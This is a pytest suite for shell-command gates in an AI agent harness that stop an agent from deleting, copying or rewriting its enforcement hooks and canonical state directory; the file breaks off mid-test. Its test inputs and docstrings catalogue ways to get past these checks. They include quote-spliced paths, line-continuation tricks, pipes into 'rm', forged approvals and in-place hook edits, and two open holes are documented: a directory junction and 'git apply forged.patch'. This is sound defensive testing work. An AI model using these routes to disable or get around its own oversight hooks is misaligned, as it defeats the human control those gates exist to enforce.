    spellings = _BREAK_SPELLINGS[tool]
    verdicts = {spelling: _shell_verdicts(tmp_path, shape % spelling, kit=kit, tool=tool)
                for spelling in spellings}
    for gate, first in verdicts[spellings[0]].items():
        for spelling in spellings[1:]:
            assert first == verdicts[spelling][gate], "%s/%s (%s): %r is rc %d, %r is rc %d" % (
                kit, gate, tool, spellings[0], first, spelling, verdicts[spelling][gate])


# WHICH CONTINUATION EACH GATED SHELL REALLY HONOURS, measured 2026-08-24 by asking a real
# `bash.exe` and a real `powershell.exe` whether `echo one<PAIR>echo two` ran ONE command or two.
# The line is a write to the file the provider reads to learn which hooks run, so `refused` is the
# answer wherever the named shell would run the second statement, and `allowed` wherever it really
# continues the line -- and each `allowed` row is measured against the shell itself as well, with a
# file witness: the shell must then write nothing.
_CONTINUATION_TRUTH = [
    ("Bash", "backslash + LF", "\\\n", 0),
    ("Bash", "backslash + CRLF", "\\\r\n", 0),
    ("Bash", "backtick + LF", "`\n", 2),
    ("Bash", "backtick + CRLF", "`\r\n", 2),
    ("PowerShell", "backslash + LF", "\\\n", 2),
    ("PowerShell", "backslash + CRLF", "\\\r\n", 2),
    ("PowerShell", "backtick + LF", "`\n", 0),
    ("PowerShell", "backtick + CRLF", "`\r\n", 2),
]


@pytest.mark.parametrize("kit", KITS)
@pytest.mark.parametrize("tool,what,pair,verdict", _CONTINUATION_TRUTH)
def test_a_continuation_the_named_shell_does_not_honour_is_not_joined(
        tmp_path, kit, tool, what, pair, verdict):
    """A break the gate removes as a continuation is a break the gate cannot see.

    The union of both escape characters was one rule for two shells that disagree, and it removed a
    break the NAMED shell honours. Measured with a file witness in the dev and office kits, before
    this round: with `tool_name: PowerShell`, `Get-Content README.md <BS><LF>Set-Content -Path
    .claude/settings.json -Value POISONED` was gate rc 0, `powershell.exe` rc 0 and the file
    overwritten; `<BS><CRLF>` the same. PowerShell continues a line over a BACKTICK, not over a
    backslash.

    BOTH DIRECTIONS ARE IN THE TABLE, which is what keeps this from being "refuse anything with a
    backslash in it": each shell's OWN continuation stays allowed, and every allowed row was
    measured against the real shell too -- bash runs `echo hello tee .claude/settings.json` as one
    command and writes nothing, PowerShell answers rc 1 and writes nothing.
    """
    dispatched_repo(tmp_path)
    write = ("Set-Content -Path .claude/settings.json -Value x" if tool == "PowerShell"
             else "tee .claude/settings.json")
    command = ("Get-Content README.md " if tool == "PowerShell" else "echo hello ") + pair + write
    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
    result = run_scope(tmp_path, payload, kit=kit)
    assert result.returncode == verdict, "%s %r: rc %d\n%s" % (
        tool, command, result.returncode, result.stderr)


def test_every_gated_shell_tool_has_its_own_continuation_rule():
    """Both ends of the one table in this layer that IS an enumeration.

    The tools a kit gates are `SHELL_TOOLS`, read off a shipped gate rather than repeated here. An
    entry missing from `_CONTINUATION_BY_TOOL` falls back to the union of both escape characters,
    which is the defect this table exists for; an entry that is in it and NOT gated is a rule
    nothing reaches. Neither end is visible in any behaviour test, because a tool nobody gates
    produces no measurement.
    """
    scope = load_hook_module("gate_write_scope")
    assert set(_compat._CONTINUATION_BY_TOOL) == set(scope.SHELL_TOOLS), (
        sorted(_compat._CONTINUATION_BY_TOOL), sorted(scope.SHELL_TOOLS))


def test_a_commit_message_with_a_write_verb_is_still_prose(tmp_path):
    """The counterpart that gives the raw/prose-stripped split its meaning: the earlier version of
    this test had no write verb before the path, so it passed with the split removed."""
    dispatched_repo(tmp_path)
    command = 'git commit -m "rm the project_memory hack and move on"'
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


@pytest.mark.parametrize("command,what", [
    # the measured BUG-0020/H34 chain: a write verb whose flag COLLIDES with a message spelling
    # under the removal's IGNORECASE (`-F` folds onto `-f`, `-b` is `cp`'s backup), so the quoted
    # PATH behind it used to be deleted as prose before any gate read the line.
    ('rm -f "project_memory/decisions/active/DEC-0001.yaml"', "canonical state directory"),
    ("rm -f 'project_memory/decisions/active/DEC-0001.yaml'", "canonical state directory"),
    ('rm -F "project_memory/decisions/active/DEC-0001.yaml"', "canonical state directory"),
    ('rm -rf "project_memory/decisions/active/DEC-0001.yaml"', "canonical state directory"),
    ('mv "project_memory/decisions/active/DEC-0001.yaml" x', "canonical state directory"),
    ('cp x -b "team-kits/kernel/hashing.py"', "enforcement layer"),
])
def test_a_write_verbs_quoted_operand_is_a_path_not_a_removable_message(tmp_path, command, what):
    """BUG-0020/H34 — the message removal was bound to the FLAG spelling and blanked the quoted span
    behind it whatever the verb, so `rm -f "…"`/`cp -b "…"` lost their PATH operand and the gate saw
    a line that named nothing. It deleted a canonical item (DEC-0001) in a real session.

    RED without the fix: point `_MESSAGE_ARG_RX` back at the line-wide `_MESSAGE_FLAG_RX` and each of
    these is rc 0, and a real bash deletes/overwrites the guarded file (measured out of repo)."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2, command
    assert what in result.stderr, result.stderr


@pytest.mark.parametrize("command", [
    # a message-bearing verb keeps its prose exemption, so a refusal's own remedy ("report the
    # defect and quote the command") does not fall through the gate it reports.
    'git commit -m "docs: purge the project_memory workaround"',
    "git commit --message='delete project_memory/old and move on'",
    'gh issue create --title x --body "the refused line named .claude and team-kits"',
])
def test_a_message_bearing_verb_keeps_its_prose_exemption(tmp_path, command):
    """The other end of the tripwire: binding to the verb must not start refusing the commit/issue
    messages the removal exists for. RED if the message-bearing verb set were emptied — these name
    protected trees inside prose and would then read as writes into them."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


def test_remove_item_names_the_state_dir_through_powershell(tmp_path):
    """The PowerShell spelling of the same deletion, refused on the NAME with no flag involved — the
    counterpart that shows the fix did not shrink to Bash `rm`."""
    dispatched_repo(tmp_path)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "PowerShell", "cwd": str(tmp_path),
               "tool_input": {"command": 'Remove-Item "project_memory/approvals/APR-0001.yaml"'}}
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "canonical state directory" in result.stderr


def test_relocating_the_enforcement_layer_is_refused(tmp_path):
    """The shortest measured route to a forged approval was `cp -r .claude/hooks kk && python
    kk/gate_approval.py < forged.json` — no path check on the SECOND command can see it, so the
    COPY is what gets refused."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, "cp -r .claude/hooks kk"))
    assert result.returncode == 2
    assert "enforcement layer" in result.stderr


@pytest.mark.parametrize("command", [
    "mypy team-kits/dev-team/hooks/gate_write_scope.py",
    "python -m mypy .claude/hooks/gate_approval.py",
    "python .git/hooks/pre-commit",
    "python scripts/hooks/build.py",
    "python -c print('kernel panic')",
    "npm run build > build.log",
    "echo done > project_memory_notes.txt",
])
def test_legitimate_commands_are_not_accused_of_forgery(tmp_path, command):
    """A gate that tells a linter it is forging approvals is a gate someone switches off. The
    interpreter is anchored (so `mypy`/`copy` cannot supply the "py"), the hook path must sit in an
    enforcement directory, and the kernel check needs an import shape rather than a bare word."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize("command", [
    "$(which python) .claude/hooks/gate_approval.py",
    "cp -r .claude kk",
    "cat .claude/hooks/gate_approval.py > kk/g.py",
    "install -D .claude/hooks/gate_approval.py kk/g.py",
    "ln -s .claude/hooks/gate_approval.py g.py",
    "tar -cf hooks.tar .claude/hooks",
    "cd project_memory && echo x > approvals/APR-0001.yaml",
    "perl -i -pe s/a/b/ project_memory/approvals/APR-0001.yaml",
    "node -e require('fs').writeFileSync('project_memory/x.yaml','y')",
    "tar -xf backup.tar -C project_memory",
])
def test_naming_a_protected_path_outside_a_read_only_command_is_refused(tmp_path, command):
    """The inverted rule. Listing write VERBS lost to the next one every time — `cp -r
    .claude/hooks kk` was refused while `cp -r .claude kk`, one token away, was not, and `cat
    <hook> > copy.py`, `install -D`, `tar`, `ln -s`, `perl`, `node` and a `cd` into the state dir
    all walked past. Naming a protected path now requires a demonstrably read-only command."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


@pytest.mark.known_hole("state_write_protection.shell")
def test_a_junction_hides_the_state_dir_from_the_shell_check(tmp_path):
    """KNOWN OPEN PATH, asserted rather than implied.

    The FILE half realpaths its target, so a junction is resolved there. The SHELL half is textual
    and cannot be: `echo x > pm/approvals/APR-0001.yaml` names no protected path, and creating the
    junction (`cmd /c mklink /J pm project_memory`) is itself an ordinary command. Closing it needs
    a PERMISSION posture, not more regex — `python scripts/harness.py doctor` must weigh the permission set rather
    than this gate's presence. WHEN A POSTURE CLOSES IT, INVERT THIS TEST."""
    dispatched_repo(tmp_path)
    command = "echo x > pm/approvals/APR-0001.yaml"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


def load_hook_module(name, hooks_dir=None):
    """Import a shipped hook as a module, for the few properties only a unit test can reach.

    `hooks_dir` because a few gates are kit-SPECIFIC: `gate_ledger_valid` ships in office-team
    only, and defaulting to dev-team's directory made the import fail with a bare
    FileNotFoundError that reads like a missing file rather than a wrong lookup."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        name, os.path.join(hooks_dir or HOOKS, name + ".py"))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


# -- gate_write_scope: the shapes the mutation battery found unpinned ---------

@pytest.mark.parametrize("command", [
    "cat .claude/hooks/gate_approval.py | tee kk/g.py",
    "ls .claude/hooks/*.py | xargs rm -f",
    "grep -rn x .claude/hooks --include=*.py -l | xargs rm",
])
def test_a_pipe_cannot_carry_a_protected_path_into_a_write(tmp_path, command):
    """A pipe is a DATA CHANNEL, not a command boundary: stage 1 may be read-only and name the
    protected path while stage 2 does the writing. Treating `|` as a separator let `cat <hook> |
    tee copy` through — and `ls .claude/hooks/*.py | xargs rm -f`, which deletes every gate in the
    bundle. A pipeline is judged as one unit."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


def test_two_pipelines_are_judged_separately(tmp_path):
    """The counterpart, so the split itself is pinned: a read-only pipeline followed by an
    unrelated write must pass, or "judge a pipeline as one unit" would just mean "block more"."""
    dispatched_repo(tmp_path)
    command = "cat project_memory/generated/index.yaml && echo done > /tmp/out.txt"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


@pytest.mark.parametrize("command", [
    "grep -E 'PR|SR' project_memory/generated/index.yaml",
    "grep -rn 'approved|revoked' project_memory/approvals",
    "awk -F'|' '{print $1}' project_memory/report.txt",
    "git log --format='%h -> %s' -- project_memory",
])
def test_a_quoted_pipe_or_arrow_is_not_shell_punctuation(tmp_path, command):
    """Splitting raw text made `grep -E 'PR|SR' <state>` two nonsense segments and refused it — the
    gate blocking the exact inspection its own message promises. Tokenising keeps a quoted `|` and
    a quoted `->` inside one token."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "find project_memory -name '*.yaml'",
    "sort project_memory/generated/index.yaml",
    "jq . project_memory/generated/index.json",
    "sed -n '1,20p' project_memory/product/active/PR-0001.yaml",
    "du -sh project_memory",
    "test -f project_memory/generated/index.yaml",
    "echo project_memory/staging is where proposals go",
    "git -C project_memory log --oneline",
    "git add .claude/agents/backend-developer.md",
    "git diff project_memory > /tmp/state.diff",
    "yamllint .github/workflows/ci.yml",
    "git add .github/workflows/ci.yml",
    "python -m mypy .claude/hooks/gate_approval.py",
])
def test_routine_inspection_is_not_refused(tmp_path, command):
    """The inverted rule is broad, so its allow-side is where the risk moved. `find`/`jq`/`sort`
    are how you read a generated index; `git add` writes the INDEX, not the worktree, and refusing
    it while `git add -A` stages the same file is an artefact; `.github/workflows` is NOT
    enforcement (guard_harness_selfmod allows it), and a shell rule stricter than the file rule
    teaches an agent to route around the shell."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "sed -i s/a/b/ project_memory/approvals/APR-0001.yaml",
    "find project_memory -name '*.yaml' -delete",
])
def test_a_conditionally_read_only_verb_is_judged_by_its_flags(tmp_path, command):
    """`sed` and `find` read or write depending on one flag, so the verb alone cannot decide."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


@pytest.mark.parametrize("path", [".codex/agents/x.toml", ".agents/skills/y.md",
                                  ".github/hooks/pre-commit", "team-kits/dev-team/hooks/x.py"])
def test_every_protected_tree_is_covered(tmp_path, path):
    """The shell list is derived from what guard_harness_selfmod already refuses to Edit/Write;
    the two disagreeing in EITHER direction is how an agent learns which tool to route around."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, "cp %s /tmp/x" % path)).returncode == 2


def test_the_state_dir_is_matched_case_insensitively_in_the_shell_too(tmp_path):
    dispatched_repo(tmp_path)
    command = "echo x > Project_Memory/approvals/APR-0001.yaml"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


def test_python_m_is_only_read_only_for_analysers(tmp_path):
    """`-m pytest` executes arbitrary code; allowing one spelling while refusing `pytest <path>`
    was the inconsistency, so neither is read-only now."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(
        tmp_path, "python -m pytest .claude/hooks")).returncode == 2


def test_a_heredoc_body_is_prose(tmp_path):
    """Every LINE of a heredoc used to be read as its own command, so writing documentation about
    the harness was refused."""
    dispatched_repo(tmp_path)
    command = "cat > /tmp/notes.md <<EOF\nproject_memory is the state dir\n.claude holds hooks\nEOF"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


def _shell_verdicts(tmp_path, command, kit="dev-team", tool="Bash"):
    """{gate name: exit code} for every REGISTERED shell gate, each a real process.

    The registration is read by `_registered_shell_gates` above — one reader for the whole file,
    because "which gates does a shell call pass" is a question for settings.json and a second
    reader of it is the drift this repo keeps paying for.

    `tool` because both shell tools go through the same registration and the two disagree about
    what a command line means; a caller that must ask the question on the other rail should not
    have to grow a second runner for it.
    """
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    payload = json.dumps(dict(shell_payload(tmp_path, command), tool_name=tool))
    gates = _registered_shell_gates(kit)
    assert len(gates) >= 5, gates
    return {name: subprocess.run(
        [sys.executable, os.path.join(TEAM_KITS, kit, "hooks", name)], input=payload,
        capture_output=True, text=True, env=env, timeout=120).returncode for name in gates}


def test_a_literally_quoted_heredoc_body_is_not_command_text(tmp_path):
    """THE BODY OF `<<'EOF'` IS DATA, and the bisection that found this went to the character.

    `capture` takes its payload on stdin, so the route a role is told to use for a proposal is a
    here-document — and one word of ordinary prose closed it:
        python scripts/harness.py capture SR <<'EOF' / from git clone to a 200 on /health / EOF
    passed every registered gate, and the same line with BACKTICKS around `git clone` was refused.
    In a real shell a quoted delimiter means the body is expanded in no way at all, so those
    backticks are two characters in a document; the gates lifted them out as a command
    substitution and judged prose.

    BOTH DIRECTIONS, because the fix must not buy silence:
      * an UNQUOTED delimiter still expands, so a `$(…)` and a backtick in THAT body really are
        commands this line runs and stay refused;
      * a body handed to something that PARSES it (`sh <<'EOF'`) is code whatever its delimiter
        says, and stays refused.
    Measured through the gates settings.json registers, not through a helper's own idea of them.
    """
    dispatched_repo(tmp_path)
    prose = "python scripts/harness.py capture SR <<'EOF'\nfrom `git clone` to a 200 /health\nEOF"
    assert set(_shell_verdicts(tmp_path, prose).values()) == {0}, _shell_verdicts(tmp_path, prose)

    expanding = "python scripts/harness.py capture SR <<EOF\nx `git push --force origin main`\nEOF"
    assert 2 in _shell_verdicts(tmp_path, expanding).values(), (
        "an UNQUOTED delimiter expands, so this body really does run a force push")
    substitution = ("python scripts/harness.py capture SR <<EOF\n"
                    "x $(git push --force origin main)\nEOF")
    assert 2 in _shell_verdicts(tmp_path, substitution).values()
    executed = "sh <<'EOF'\ngit push --force origin main\nEOF"
    assert 2 in _shell_verdicts(tmp_path, executed).values(), (
        "a shell PARSES its standard input, so this body is the command and not a document")
    # a KEPT body must not become its own hiding place: resuming the scan inside one let a line
    # that merely PRINTS a here-document opener swallow the command underneath it
    nested = "sh <<EOF\necho \"<<'X'\"\ngit push --force origin main\nX\nEOF"
    assert 2 in _shell_verdicts(tmp_path, nested).values(), (
        "an opener QUOTED inside a body that stays is text, not a second here-document")


def test_the_documented_route_out_of_staging_is_open(tmp_path):
    """`staging/**` HAD NO EXIT, measured against the real gate.

    Spec II.4 makes `staging/<task-id>/` the non-canonical proposal area, and the role that fills
    it has no shell by design — the lead books the proposal in. Both spellings the kits document
    for that hand the file to the entry point as standard input, and both were refused: the
    pipeline can write and it names the state directory, which was all rule 1 asked.

    THE NARROWING IS THE OTHER HALF OF THE TEST. A read of `staging/**` is not a write, but only
    while it really is a read, only while the path really is under `staging/`, and only while the
    state directory is named nowhere else in the line.
    """
    dispatched_repo(tmp_path)
    source = "project_memory/staging/TSK-0001/SR-0001.json"
    for opened in ("python scripts/harness.py capture SR < " + source,
                   "cat %s | python scripts/harness.py capture SR" % source):
        assert run_scope(tmp_path, shell_payload(tmp_path, opened)).returncode == 0, opened
    for refused in (
            # a CANONICAL read into a writing pipeline is not a proposal being booked in
            "python scripts/harness.py capture SR < project_memory/product/active/PR-0001.yaml",
            # the same read, but the line also writes canonical state
            "python scripts/harness.py capture SR < %s > project_memory/product/active/x.yaml"
            % source,
            # staging named by a WRITING verb is not a read at all
            "cp %s project_memory/product/active/x.yaml" % source,
            "rm -rf project_memory/staging/TSK-0001",
            "cat %s | tee project_memory/product/active/PR-0001.yaml" % source,
            # the SAME word as source and as target: a membership test alone reads the second
            # mention off the first and opens a shell write INTO the state tree
            "python scripts/harness.py capture SR < %s > %s" % (source, source)):
        result = run_scope(tmp_path, shell_payload(tmp_path, refused))
        assert result.returncode == 2, (refused, result.stdout + result.stderr)


@pytest.mark.parametrize("command", [
    # the DIRECTORY part, which is where every prefix check in the gate reads
    "echo x > project'_'memory/product/active/PR-0001.yaml",
    "echo x > '.cl'aude/hooks/gate_write_scope.py",
    'echo x > ".cl"aude/hooks/gate_git.py',
    "echo x > .cl''aude/hooks/gate_git.py",
    "echo x > team'-'kits/dev-team/hooks/x.py",
    # a splice that arms a later write by moving into the tree
    "cd '.cl'aude && echo x > hooks/gate_git.py",
    # the POSIX escape: the same word, spelled with the other shell's quoting character
    "echo x > .cl\\aude/hooks/gate_git.py",
])
def test_a_quote_splice_in_a_path_does_not_buy_a_write(tmp_path, command):
    """THE RULE READS THE RESOLVED STRING, NOT THE TYPED ONE.

    Shell quoting is invisible to the program: `'.cl'aude/hooks/x.py` reaches the filesystem as
    `.claude/hooks/x.py`. Measured 2026-08-04 — every registered gate allowed each line here, and
    a real Git Bash then overwrote the file — while the same paths spelled plainly were refused by
    `gate_write_scope`. A splice in the FILE NAME was caught, which is how this stood: the
    directory prefix still spelled itself out there.
    """
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2, (command, result.stdout + result.stderr)


@pytest.mark.parametrize("command", [
    # a quoted PIPE is data, not a pipeline — the resolution must not turn it into one
    "grep -E 'PR|SR' project_memory/product/active/PR-0001.yaml",
    "git log --format='%h -> %s'",
    # a word that RESOLVES to a redirect operator is not a redirect
    "echo '>' notes.txt",
    "echo 'a > b is a redirect'",
    # ordinary reads of the protected trees, with and without output suppressed
    "cat .claude/hooks/gate_git.py",
    "ls .claude/agents/ 2>/dev/null",
    "git diff project_memory > /tmp/state.diff",
])
def test_resolving_the_quoting_does_not_refuse_what_the_quoting_protected(tmp_path, command):
    """The mirror of the splice test: removing the marks must not promote quoted DATA to syntax.

    `'PR|SR'` was the case that forced the tokeniser to keep quotes in the first place — the gate
    used to split it into nonsense and refuse the exact inspection its own message promises stays
    allowed. Resolving the word AFTER the split is what keeps both true at once.
    """
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 0, (command, result.stdout + result.stderr)


def test_a_spliced_entry_point_still_orders_work(tmp_path):
    """Rule 4 reads a path too, and it read the typed one: `scripts/'har'ness.py create-task`
    resolved to the entry point and ordered work, while `_harness_argv` compared the basename
    `'har'ness.py` and found no CLI invocation at all."""
    dispatched_repo(tmp_path)
    for command in ("python scripts/'har'ness.py create-task",
                    "python scripts/har\\ness.py create-task"):
        result = run_scope(tmp_path, dict(shell_payload(tmp_path, command),
                                          agent_type="backend-developer"))
        assert result.returncode == 2 and "ORDERS work" in result.stderr, (
            command, result.stdout + result.stderr)


def test_a_cd_into_the_state_dir_carries_over(tmp_path):
    """`cd project_memory && echo x > approvals/x.yaml`: the path is named in the FIRST pipeline
    and the write happens in the second, which names nothing."""
    dispatched_repo(tmp_path)
    command = "cd project_memory && echo x > approvals/APR-0001.yaml"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


# -- scope patterns: the two shapes realpath cannot carry ---------------------

def test_a_directory_form_star_does_not_widen(tmp_path):
    """`*` means ONE segment. A trailing `(?:/.*)?` in the matcher handed back everything below it,
    so `src/*` matched `src/sub/deep/a.py` and a bare `*` granted the repo at any depth. The FILE
    form (`src/*.py`) cannot detect that, which is why it went unnoticed."""
    _state, _task = bound_repo(tmp_path, allowed_scope=["src/*"])
    payload = write_payload(tmp_path, tmp_path / "src" / "sub" / "deep" / "a.py",
                            agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 2


def test_a_case_mismatched_scope_entry_still_matches(tmp_path):
    """A scope entry has no filesystem object to canonicalise — `forbidden_scope: ["Secrets/"]`
    routinely names a directory that does not exist yet, which is often WHY it is forbidden. So
    realpath cannot carry this case; the fold is the only defence on the pattern side."""
    _state, _task = bound_repo(tmp_path, allowed_scope=["**"], forbidden_scope=["Secrets/"])
    payload = write_payload(tmp_path, tmp_path / "secrets" / "keys.env", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "forbidden_scope" in result.stderr


def test_the_state_dir_case_fold_works_without_a_state_dir(tmp_path):
    """The other half realpath cannot carry: with no state dir on disk there is nothing to
    canonicalise, so a case variant is caught by the fold alone."""
    payload = write_payload(tmp_path, tmp_path / "Project_Memory" / "approvals" / "APR-0001.yaml")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "canonical project state" in result.stderr


def test_norm_folds_case_even_where_normcase_does_not(monkeypatch):
    """macOS: `os.path.normcase` is IDENTITY on darwin while APFS is case-insensitive by default,
    so the explicit `.lower()` is the whole defence there. This host cannot measure that — the
    monkeypatch is the only way to assert it at all."""
    module = load_hook_module("gate_write_scope")
    monkeypatch.setattr(module.os.path, "normcase", lambda s: s)
    assert module._norm("Project_Memory/Approvals") == "project_memory/approvals"


# -- gate_write_scope: the tokeniser contract and the multi-line shapes -------

def test_a_harmless_first_line_does_not_disarm_the_rule(tmp_path):
    """`\\n` is WHITESPACE to shlex, so a newline never became a token and multi-line commands
    merged into ONE pipeline whose verb was the harmless first one. Prefixing any refused command
    with `echo start` defeated the entire rule."""
    dispatched_repo(tmp_path)
    command = "echo start\ncp -r .claude/hooks kk"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


def test_a_later_line_does_not_taint_an_earlier_read(tmp_path):
    """The same cause in the other direction: line 2's redirect used to make the merged pipeline
    write-capable while line 1 named the enforcement layer."""
    dispatched_repo(tmp_path)
    command = "grep -n mint .claude/hooks/gate_approval.py\necho done > /tmp/o.txt"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


def test_a_continued_line_is_still_one_command(tmp_path):
    dispatched_repo(tmp_path)
    command = "cp -r \\\n  .claude/hooks kk"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


@pytest.mark.parametrize("command", [
    "echo x>project_memory/approvals/APR-0001.yaml",
    "echo x>>project_memory/approvals/APR-0001.yaml",
    "cat .claude/hooks/gate_approval.py>kk/g.py",
    "cat .claude/hooks/gate_approval.py|tee kk/g.py",
    "ls .claude/hooks/*.py|xargs rm -f",
    "cd project_memory&&echo x>a.yaml",
])
def test_the_unspaced_spellings_are_seen_too(tmp_path, command):
    """`punctuation_chars=True` is what splits `>`/`|`/`&&` without surrounding spaces. Every
    shell test in this file used the SPACED form, so removing that flag changed nothing the suite
    could see — while these six all became invisible."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


def test_the_tokeniser_resolves_a_word_without_promoting_quoted_data_to_syntax():
    """THE TWO HALVES THE TOKENISER HAS TO GET RIGHT AT ONCE, pinned directly.

    It used to keep the quote MARKS on the word, and that was load-bearing in the wrong place: the
    quoting decided the word boundaries (right) and then every path rule compared against a string
    no program ever receives (wrong — `'.cl'aude/hooks/x.py` reaches the filesystem as
    `.claude/hooks/x.py`). Resolving the word without losing the boundary decision is what
    `_compat.shell_words` does, and both halves have to hold together:
      * the WORD is what the program gets — the marks are gone and the fragments are ONE word;
      * a word that quoting produced is never SYNTAX, so `'PR|SR'` is not a pipeline and a quoted
        `>` is not a redirect. `_operator` is the reader that has to say so.
    Switching either half back changes what every path rule in the gate sees while failing nothing
    else, which is why this is a pin and not a consequence.
    """
    module = load_hook_module("gate_write_scope")
    words = module._tokenise("grep -E 'PR|SR' '.cl'aude/hooks/x.py")
    assert "PR|SR" in words and ".claude/hooks/x.py" in words, words
    assert [module._operator(w) for w in words if module._operator(w) == "|"] == [], (
        "a quoted pipe was promoted to a pipeline separator")
    assert "|" in [module._operator(w) for w in module._tokenise("a | b")]
    assert module._operator(module._tokenise("echo '>' f")[1]) == "", (
        "a quoted redirect operator must not read as one")
    # every reading a shell could give the word, which is what the path rules search over
    assert ".claude/hooks/x.py" in module._readings(
        module._tokenise("echo x > .cl\\aude/hooks/x.py")[-1])


# -- write-capable verbs that hide behind a flag or a quoted program ----------

@pytest.mark.parametrize("command", [
    "sed --in-place s/a/b/ project_memory/approvals/APR-0001.yaml",
    "sed --in-place=.bak s/a/b/ project_memory/approvals/APR-0001.yaml",
    "sed -ni w-out project_memory/approvals/APR-0001.yaml",
    "sort -o project_memory/approvals/APR-0001.yaml forged.yaml",
    "sort --output=project_memory/approvals/APR-0001.yaml forged.yaml",
])
def test_long_and_clustered_write_flags_are_matched(tmp_path, command):
    """`"--in-place".startswith("-i")` is False, so the long form rewrote canonical state — and a
    LIVE hook, which disarms a gate rather than merely copying it. `sort -o` was not classified at
    all."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


def test_an_in_place_edit_of_a_shipped_hook_is_refused(tmp_path):
    """The worst outcome in this series: every other route COPIED the layer and ran the copy; this
    one rewrites the installed gate where it stands."""
    dispatched_repo(tmp_path)
    command = "sed --in-place s/mint/xxxx/ .claude/hooks/gate_approval.py"
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


@pytest.mark.parametrize("command", [
    'awk \'BEGIN{print "x" > "project_memory/approvals/APR-0001.yaml"}\'',
    'awk \'BEGIN{while((getline l < ".claude/hooks/gate_approval.py")>0) print l > "kk/g.py"}\'',
])
def test_a_redirect_inside_a_quoted_program_counts(tmp_path, command):
    """`>` only becomes a TOKEN outside quotes, and `posix=False` preserves the quoting — so for
    the verbs whose program IS an argument, a redirect can hide where no token ever appears."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 2


# -- the `cd` carry-over, both trees and both directions ----------------------

def test_a_cd_into_the_enforcement_layer_carries_over(tmp_path):
    """The state dir had this carry-over; the enforcement layer did not, so a round-3 block
    regressed the moment `cd` became a read-only verb."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(
        tmp_path, "cd .claude && cp -r hooks /tmp/kk")).returncode == 2


@pytest.mark.parametrize("command", [
    "cd project_memory && ls && cd .. && echo done > /tmp/ok.txt",
    "pushd project_memory; ls; popd; echo x > /tmp/notes.txt",
])
def test_leaving_the_state_dir_clears_the_carry_over(tmp_path, command):
    """Once set, the flag never cleared — so after merely LOOKING inside the state dir, every
    later write in the same command was refused wherever it went."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


@pytest.mark.parametrize("command", [
    "( cat .claude/hooks/gate_approval.py )",
    "{ cat project_memory/generated/index.yaml; }",
])
def test_grouping_punctuation_is_not_a_verb(tmp_path, command):
    """Reading inside a group was refused while the same command bare was allowed — fail-closed,
    but wrong, and the kind of inconsistency that makes an agent stop trusting the message."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


@pytest.mark.known_hole("state_write_protection.shell")
def test_a_payload_carried_inside_a_file_is_invisible(tmp_path):
    """KNOWN OPEN PATH, asserted rather than implied — and a different MECHANISM from the junction.

    The junction is a path-IDENTITY failure, which the file half already resolves with realpath.
    This is the path never appearing on the command line at all: `git apply forged.patch`,
    `git am`, `patch -p1 < forged.patch`, `git stash pop`. A bound specialist may Write the patch
    inside its own `allowed_scope` and then apply it. No command-line rule can see the target, so
    closing it needs a PERMISSION posture. WHEN A POSTURE CLOSES IT, INVERT THIS TEST."""
    dispatched_repo(tmp_path)
    assert run_scope(tmp_path, shell_payload(tmp_path, "git apply forged.patch")).returncode == 0


# -- gate_write_scope: descending is not leaving ------------------------------

@pytest.mark.parametrize("command", [
    "cd project_memory && cd approvals && echo x > f.yaml",
    "cd project_memory && cd ./approvals && echo x > f.yaml",
